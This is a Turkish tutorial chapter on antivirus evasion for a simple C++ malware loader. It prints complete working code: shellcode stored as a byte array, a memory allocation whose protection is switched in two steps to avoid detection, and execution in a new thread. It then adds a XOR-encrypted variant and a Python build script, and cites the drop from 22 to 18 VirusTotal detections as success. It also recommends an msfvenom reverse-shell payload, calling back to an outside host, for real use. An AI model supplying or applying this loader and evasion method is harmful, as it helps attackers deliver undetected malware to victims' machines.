\newpage
\subsection{54. C++ basit zararlı yazılımı için AV motorlarından kaçınma.}

﷽

![AV evasion 1](./images/2/2021-09-16_11-09.png){width="80%"}    

AV kaçınma, özellikle zararlı yazılım yazan red team üyeleri ve pentesterlar için her zaman zorlu bir süreç olmuştur.     

Bu eğitimde, C++ ile basit bir zararlı yazılım yazacağız ve bu yazılım, payload olarak `calc.exe` sürecini başlatacak. Daha sonra bu zararlıyı VirusTotal üzerinden tarayarak kaç AV motorunun algıladığını kontrol edeceğiz. Ardından, tespit edilen AV motorlarının sayısını azaltmaya çalışacağız.     

Öncelikle, zararlı yazılımımızın basit C++ koduyla başlayalım:      
```cpp
/*
cpp implementation malware example with calc.exe payload
*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// our payload calc.exe
unsigned char my_payload[] = {
  0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 
  0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 
  0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 
  0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 
  0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 
  0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
  0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52,
  0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 
  0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 
  0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 
  0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 
  0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
  0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 
  0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 
  0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 
  0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 
  0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 
  0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
  0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 
  0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 
  0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 
  0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 
  0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
  0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 
  0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 
  0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 
  0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
};
unsigned int my_payload_len = sizeof(my_payload);

int main(void) {
  void * my_payload_mem; // memory buffer for payload
  BOOL rv;
  HANDLE th;
  DWORD oldprotect = 0;

  // Allocate a memory buffer for payload
  my_payload_mem = VirtualAlloc(0, my_payload_len, 
  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

  // copy payload to buffer
  RtlMoveMemory(my_payload_mem, my_payload, my_payload_len);

  // make new buffer as executable
  rv = VirtualProtect(my_payload_mem, my_payload_len, 
  PAGE_EXECUTE_READ, &oldprotect);
  if ( rv != 0 ) {

    // run payload
    th = CreateThread(0, 0, 
    (LPTHREAD_START_ROUTINE) my_payload_mem, 
    0, 0, 0);
    WaitForSingleObject(th, -1);
  }
  return 0;
}

```

Yani elimizde sadece bir tane `main(void)` fonksiyonu var:    

![main function](./images/2/2021-09-04_11-40.png){width="80%"}    

Ve elimizde `sizeof(my_payload)` boyutunda bir payload var.    

Basitlik açısından, payload olarak `calc.exe` kullanıyoruz. Payload'un oluşturulma sürecine girmeden, sadece hazır payload’u kodumuza ekleyeceğiz:     

```cpp
unsigned char my_payload[] = {
  0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 
  0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 
  0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 
  0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 
  0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 
  0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
  0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52,
  0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 
  0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 
  0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 
  0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 
  0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
  0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 
  0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 
  0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 
  0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 
  0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 
  0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
  0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 
  0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 
  0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 
  0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 
  0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
  0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 
  0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 
  0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 
  0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
};
```

Ve `main` fonksiyonumuzun ana mantığı şu şekildedir:    

![main function logic](./images/2/2021-09-04_11-57.png){width="80%"}    

Öncelikle bu mantığı inceleyelim. Eğer payload'umuzu bir sürecin belleğinde çalıştırmak istiyorsak, birkaç adımı gerçekleştirmemiz gerekir. Yeni bir bellek bölgesi tahsis etmeli, payload'umuzu bu belleğe kopyalamalı ve ardından bu belleği çalıştırmalıyız.      

İlk olarak, bir süreç içinde yeni bir bellek bölgesi ayırıyoruz ve bu adresi `my_payload_mem` değişkenine kaydediyoruz:    

![allocate new memory region](./images/2/2021-09-04_12-08.png){width="80%"}    

ve bu bellek bölgesi okunabilir ve yazılabilir durumdadır.    

Daha sonra, `my_payload` verimizi `my_payload_mem` içerisine kopyalıyoruz:      

![copy payload](./images/2/2021-09-04_12-13.png){width="80%"}    

Ve ardından, buffer'ımızı yürütülebilir (executable) hale getiriyoruz:     

![set buffer to be exec](./images/2/2021-09-04_12-15.png){width="80%"}    

Tamam, her şey iyi, ama neden bunu `44` satırda yapmıyorum???    

![why](./images/2/2021-09-04_12-21.png){width="80%"}    

Neden sadece okunabilir, yazılabilir ve çalıştırılabilir bir tampon ayırmıyoruz?     

Ve sebebi oldukça basit. Bazı av araçları ve AV motorları bu bellek bölgesini tespit edebilir, çünkü bir sürecin aynı anda okunabilir, yazılabilir ve çalıştırılabilir bir belleğe ihtiyaç duyması oldukça alışılmadık bir durumdur. Bu tür bir tespiti atlatmak için iki adımda işlem yapıyoruz.     

Ve eğer her şey yolunda giderse, payload’umuz süreç içinde ayrı yeni bir iş parçacığı olarak çalıştırıyoruz:      

![new thread](./images/2/2021-09-04_13-11.png){width="80%"}    

Haydi, zararlı kodumuzu derleyelim:     

![compile](./images/2/2021-09-04_13-17.png){width="80%"}    

ve çalıştırın (Windows 10 x64 üzerinde):      

![run](./images/2/2021-09-04_14-45.png){width="80%"}

Yani temelde, payload’umuzu şifreleme olmadan `.text` bölümünde nasıl saklayabileceğinizi gösterdik.     

Hadi, `evil.exe` dosyamızı VirusTotal'a yükleyelim:     

![virustotal](./images/2/2021-09-04_13-23.png){width="80%"}    

[https://www.virustotal.com/gui/file/c9c49dbbb0a668df053d0ab788f9dde2d9e59c31672b5d296bb1e8309d7e0dfe/detection](https://www.virustotal.com/gui/file/c9c49dbbb0a668df053d0ab788f9dde2d9e59c31672b5d296bb1e8309d7e0dfe/detection)

**Yani, 66 antivirüs motorundan 22'si dosyamızı kötü amaçlı olarak algılıyor.**

Şimdi, kötü amaçlı yazılımımızı tespit eden antivirüs motorlarının sayısını azaltmaya çalışalım.      

Bunu yapmak için öncelikle payload’umuzu şifrelemeliyiz. Neden payload’umuzu şifrelemek istiyoruz? Bunun temel amacı, payload’umuz antivirüs motoru veya tersine mühendislik yapan birinden gizlemektir. Böylece, tersine mühendislik yapan biri payload’umuzu kolayca tanımlayamaz.

Şifrelemenin amacı, veriyi başkalarından gizli tutmak için dönüştürmektir.
Basitlik açısından, bu durumda XOR şifreleme kullanacağız.     

Şimdi, XOR'u kullanarak payload’umuzu nasıl şifreleyip çözeceğimize bakalım.     

Basit kötü amaçlı yazılım kodumuzu güncelleyelim:     

```cpp
/*
cpp implementation malware 
example with calc.exe payload 
encrypted via XOR
*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// our payload calc.exe
unsigned char my_payload[] = {};
unsigned int my_payload_len = sizeof(my_payload);

// key for XOR decrypt
char my_secret_key[] = "mysupersecretkey";

// decrypt deXOR function
void XOR(char * data, size_t data_len, char * key, 
size_t key_len) {
  int j;
  j = 0;
  for (int i = 0; i < data_len; i++) {
    if (j == key_len - 1) j = 0;
      data[i] = data[i] ^ key[j];
      j++;
  }
}


int main(void) {
  void * my_payload_mem; // memory buffer for payload
  BOOL rv;
  HANDLE th;
  DWORD oldprotect = 0;

  // Allocate a memory buffer for payload
  my_payload_mem = VirtualAlloc(0, my_payload_len, 
  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

  // Decrypt (DeXOR) the payload
  XOR((char *) my_payload, my_payload_len, 
  my_secret_key, sizeof(my_secret_key));

  // copy payload to buffer
  RtlMoveMemory(my_payload_mem, my_payload, 
  my_payload_len);

  // make new buffer as executable
  rv = VirtualProtect(my_payload_mem, 
  my_payload_len, 
  PAGE_EXECUTE_READ, &oldprotect);
  if ( rv != 0 ) {

    // run payload
    th = CreateThread(0, 0, 
    (LPTHREAD_START_ROUTINE) my_payload_mem, 
    0, 0, 0);
    WaitForSingleObject(th, -1);
  }
  return 0;
}
```

İlk basit uygulamamızla olan temel fark, XOR şifre çözme fonksiyonunu ve şifre çözme için gizli anahtarımız `my_secret_key` eklememizdir:     

![dexor function and key](./images/2/2021-09-04_13-47.png){width="80%"}    

Bu aslında basit bir fonksiyon, simetrik bir şifreleme yöntemi olup, aynı anahtar ile şifreleme ve şifre çözme işlemleri için kullanılabilir.    

Ve payload'umuzu belleğe kopyalamadan önce XOR'dan geri çeviriyoruz:       

![dexor our payload](./images/2/2021-09-04_13-50.png){width="80%"}    

Ve eksik olan tek şey bizim payload'umuz:     

![missing payload](./images/2/2021-09-04_13-58.png){width="80%"}    

Bu payload, XOR ile şifrelenmelidir.    

Bunun için, payload'u şifreleyen ve C++ şablonumuzda değiştiren basit bir Python betiği oluşturun:     

```python
import sys
import os
import hashlib
import string

## XOR function to encrypt data
def xor(data, key):
    key = str(key)
    l = len(key)
    output_str = ""

    for i in range(len(data)):
        current = data[i]
        current_key = key[i % len(key)]
        ordd = lambda x: x if isinstance(x, int) else ord(x)
        output_str += chr(ordd(current) ^ ord(current_key))
    return output_str

## encrypting
def xor_encrypt(data, key):
    ciphertext = xor(data, key)
    ciphertext = '{ 0x' + ', 0x'.
    join(hex(ord(x))[2:] for x in ciphertext) + ' };'
    print (ciphertext)
    return ciphertext, key

## key for encrypt/decrypt
my_secret_key = "mysupersecretkey"

## payload calc.exe
plaintext = open("./calc.bin", "rb").read()

ciphertext, p_key = xor_encrypt(plaintext, my_secret_key)

## open and replace our payload in C++ code
tmp = open("evil_xor.cpp", "rt")
data = tmp.read()
data = data.replace('unsigned char my_payload[] = { };', 
'unsigned char my_payload[] = ' + ciphertext)
tmp.close()
tmp = open("evil-enc.cpp", "w+")
tmp.write(data)
tmp.close()

## compile
try:
    cmd = "x86_64-w64-mingw32-gcc evil-enc.cpp"
    cmd += "-o evil.exe -s -ffunction-sections"
    cmd += "-fdata-sections -Wno-write-strings"
    cmd += " -fno-exceptions -fmerge-all-constants"
    cmd += "-static-libstdc++ -static-libgcc"
    cmd += " >/dev/null 2>&1"
    os.system(cmd)
except:
    print ("error compiling malware template :(")
    sys.exit()
else:
    print (cmd)
    print ("successfully compiled :)")

```

Basitlik açısından, `calc.bin` payload kullanıyoruz:     

![payload bin](./images/2/2021-09-04_14-25.png){width="80%"}

Ancak gerçek senaryoda, şu tür bir şey kullanabilirsiniz:     
```bash
msfvenom -p windows/x64/shell_reverse_tcp \
LHOST=10.9.1.6 LPORT=4444 -f raw -o hack.bin
```

Python script’ini çalıştıralım:    
```bash
python3 evil_enc.py
```

![python encrypt](./images/2/2021-09-04_14-40.png){width="80%"}    

Ve mağdurun makinesinde (`Windows 10 x64`) çalıştırın:

![result encrypted](./images/2/2021-09-04_14-38.png){width="80%"}    

Let's go to upload our new `evil.exe` with encrypted payload to Virustotal:    

Hadi, yeni şifreli payload içeren `evil.exe` dosyamızı Virustotal'a yükleyelim:     

![virustotal evil 2](./images/2/2021-09-04_14-51.png){width="80%"}    

[https://www.virustotal.com/gui/file/c7393080957780bb88f7ab1fa2d19bdd1d99e9808efbfaf7989e1e15fd9587ca/detection](https://www.virustotal.com/gui/file/c7393080957780bb88f7ab1fa2d19bdd1d99e9808efbfaf7989e1e15fd9587ca/detection)

**Bu şekilde, kötü amaçlı yazılımımızı tespit eden antivirüs motorlarının sayısını 22'den 18'e düşürdük!**     

[Github'taki kaynak kod](https://github.com/cocomelonc/2021-04-09-av-evasion-1-)    

- [VirtualAlloc](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)    
- [RtlMoveMemory](https://docs.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory)    
- [VirtualProtect](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)    
- [WaitForSingleObject](https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject)    
- [CreateThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread)    
- [XOR](https://en.wikipedia.org/wiki/XOR_cipher)    

Sonraki bölümde, fonksiyon çağrısı obfuscation tekniğini kullanarak tespit sayısını nasıl daha da azaltabileceğinizi yazacağım.      